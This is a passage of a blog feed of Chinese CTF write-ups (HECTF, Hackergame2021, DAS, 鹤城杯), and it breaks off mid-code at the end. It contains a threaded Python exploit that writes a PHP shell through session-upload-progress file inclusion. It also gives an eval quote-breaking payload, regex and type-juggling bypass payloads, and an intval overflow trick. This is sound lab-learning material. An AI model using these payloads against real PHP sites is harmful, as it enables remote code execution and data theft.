    <summary type="html">&lt;h2 id=&quot;temp&quot;&gt;&lt;a href=&quot;#temp&quot; class=&quot;headerlink&quot; title=&quot;temp&quot;&gt;&lt;/a&gt;temp&lt;/h2&gt;&lt;p&gt;这道不是极客大挑战的，就写这里吧&lt;/p&gt;
&lt;pre class=&quot;language-php&quot; data-language=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="geekchallenge" scheme="http://lll-nnn.github.io/tags/geekchallenge/"/>
    
  </entry>
  
  <entry>
    <title>HECTF</title>
    <link href="http://lll-nnn.github.io/2021/11/16/HECTF/"/>
    <id>http://lll-nnn.github.io/2021/11/16/HECTF/</id>
    <published>2021-11-16T15:38:01.000Z</published>
    <updated>2021-11-16T15:48:35.596Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>题目：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>session文件包含，写入shell到session文件</p><p>poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> requests<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor<span class="token punctuation">,</span> waittarget <span class="token operator">=</span> <span class="token string">'http://81.70.102.209:10040/index.php'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'aaaa'</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'load.png'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">40960</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">rf'''&lt;?php file_put_contents('/tmp/success', '&lt;?=system("cat /f1aggggggggggggggggggggggg");?>'); echo('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'); ?>'''</span></span><span class="token punctuation">&#125;</span>    <span class="token comment">#data = &#123;'PHP_SESSION_UPLOAD_PROGRESS': rf'''&lt;?php file_put_contents('/tmp/success', '&lt;?=system("ls /");?>'); ?>'''&#125;</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            target<span class="token punctuation">,</span>            data<span class="token operator">=</span>data<span class="token punctuation">,</span>            files<span class="token operator">=</span>files<span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> flag<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>        <span class="token keyword">if</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    futures <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>upload<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>write<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>    wait<span class="token punctuation">(</span>futures<span class="token punctuation">)</span></code></pre><p>访问<code>http://81.70.102.209:10040/?file=/tmp/success</code>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LFI-to-RCE&quot;&gt;&lt;a href=&quot;#LFI-to-RCE&quot; class=&quot;headerlink&quot; title=&quot;LFI_to_RCE&quot;&gt;&lt;/a&gt;LFI_to_RCE&lt;/h2&gt;&lt;p&gt;题目：&lt;/p&gt;
&lt;pre class=&quot;language-php&quot; data</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="session文件包含写shell" scheme="http://lll-nnn.github.io/tags/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99shell/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame2021</title>
    <link href="http://lll-nnn.github.io/2021/11/07/hackergame2021/"/>
    <id>http://lll-nnn.github.io/2021/11/07/hackergame2021/</id>
    <published>2021-11-07T07:12:15.000Z</published>
    <updated>2021-11-07T07:58:05.505Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png"></p><p><code>unix时间戳</code><br>点next后url会加上<code>page=1</code>,时间就会加一秒</p><p>时间戳网站<code>https://tool.chinaz.com/tools/unixtime.aspx</code></p><p>也可以用二分法</p><pre><code>测试 100000000000，太大 =&gt; (100000000000 + 0) / 2 = 50000000000测试 50000000000，太大 =&gt; (50000000000 + 0) / 2 = 25000000000测试 25000000000，太大 =&gt; (25000000000 + 0) / 2 = 12500000000测试 12500000000，太大 =&gt; (12500000000 + 0) / 2 = 6250000000测试 6250000000，太大 =&gt; (6250000000 + 0) / 2 = 3125000000测试 3125000000，太大 =&gt; (3125000000 + 0) / 2 = 1562500000测试 1562500000，太小（2019 年）=&gt; (1562500000 + 3125000000) / 2 = 2343750000测试 2343750000，太大 =&gt; (1562500000 + 2343750000) / 2 = 1953125000测试 1953125000，太大 =&gt; (1562500000 + 1953125000) / 2 = 1757812500测试 1757812500，太大（2025 年）=&gt; (1562500000 + 1757812500) / 2 = 1660156250测试 1660156250，太大（2022 年）=&gt; (1562500000 + 1660156250) / 2 = 1611328125测试 1611328125，太小（2021 年 1 月）=&gt; (1611328125 + 1660156250) / 2 = 1635742187测试 1635742187，太大（2021 年 11 月）=&gt; (1611328125 + 1635742187) / 2 = 1623535156测试 1623535156，太小（2021 年 6 月）=&gt; (1623535156 + 1635742187) / 2 = 1629638671测试 1629638671，太小（2021 年 8 月）=&gt; (1629638671 + 1635742187) / 2 = 1632690429测试 1632690429，太小（2021 年 9 月）=&gt; (1632690429 + 1635742187) / 2 = 1634216308测试 1634216308，太小（2021 年 10 月 14 日）=&gt; (1634216308 + 1635742187) / 2 = 16349792471634979247 得到答案（2021-10-23 16:54:07 +08:00）</code></pre><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/8d62245630118b5c.png"><br>显然，69是组合不出20的</p><p>需要猜测源码，<code>intval</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">check_last_action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bottle_6</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b6'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bottle_9</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b9'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bottle_6</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$bottle_9</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'操作无效：不能放负数个瓜。点击&lt;a href="/">这里&lt;/a>回到主页。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pool'</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$bottle_6</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token variable">$bottle_9</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>整数溢出会变为float,然后再用intval后，就会变成负数</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">;</span>   <span class="token comment">//9223372036854775807</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">9223372036854775807</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">9223372036854775808</span><span class="token punctuation">;</span><span class="token variable">$ia</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ib</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//int(9223372036854775807)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//float(9.2233720368548E+18)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ia</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// int(9223372036854775807)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ib</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//int(-9223372036854775808)</span></code></pre><pre><code>1024819115206086200 * 9 = 92233720368547758001024819115206086201 * 9 = 9223372036854775809</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086201</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-9223372036854775808)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086200</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-8)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(1)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086201</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-9223372036854775807)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086200</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-7)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(20)</span></code></pre><p>操作六次</p><pre><code>1024819115206086201 * 91024819115206086200 * 91 * 91024819115206086201 * 91024819115206086200 * 93 * 9</code></pre><p>其他两道<br>一道GraphQL，还有一道js逆向分析，不懂<br><a href="https://github.com/USTC-Hackergame/hackergame2021-writeups">https://github.com/USTC-Hackergame/hackergame2021-writeups</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png&quot;&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>DAS X 吉林工师</title>
    <link href="http://lll-nnn.github.io/2021/10/29/DAS/"/>
    <id>http://lll-nnn.github.io/2021/10/29/DAS/</id>
    <published>2021-10-29T15:25:09.000Z</published>
    <updated>2021-11-07T07:57:11.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\$array = <span class="token interpolation"><span class="token variable">$data</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrvalue</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'array('</span><span class="token punctuation">;</span>        <span class="token variable">$attrids</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$attrids</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'"'</span><span class="token punctuation">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"=>'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">.</span><span class="token variable">$attrvalue</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$attrids</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">','</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">');'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$attrstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>突破点在<code>attrvalue</code>上</p><p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p><p>flag在<code>phpinfo()</code>中</p><p>通过闭合双引号让<code>eval</code>执行命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;迷路的魔法少女&quot;&gt;&lt;a href=&quot;#迷路的魔法少女&quot; class=&quot;headerlink&quot; title=&quot;迷路的魔法少女&quot;&gt;&lt;/a&gt;迷路的魔法少女&lt;/h2&gt;&lt;pre class=&quot;language-php&quot; data-language=&quot;php&quot;&gt;&lt;code c</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>鹤城杯</title>
    <link href="http://lll-nnn.github.io/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <id>http://lll-nnn.github.io/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</id>
    <published>2021-10-10T09:17:20.000Z</published>
    <updated>2021-10-17T08:41:08.758Z</updated>
    
    <content type="html"><![CDATA[<h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token double-quoted-string string">"./flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token double-quoted-string string">"./result.php"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'$&#123;1&#125;&lt;!-- filtered -->$&#123;2&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is level 2"</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>            <span class="token comment">// START FORM PROCESSING    </span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you never beat me!"</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"out"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token comment">// perform validations on the form data</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'nonono!'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;hr>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>payload:</p><pre><code>?aaa=%0apass_the_level_1%23admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre><h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 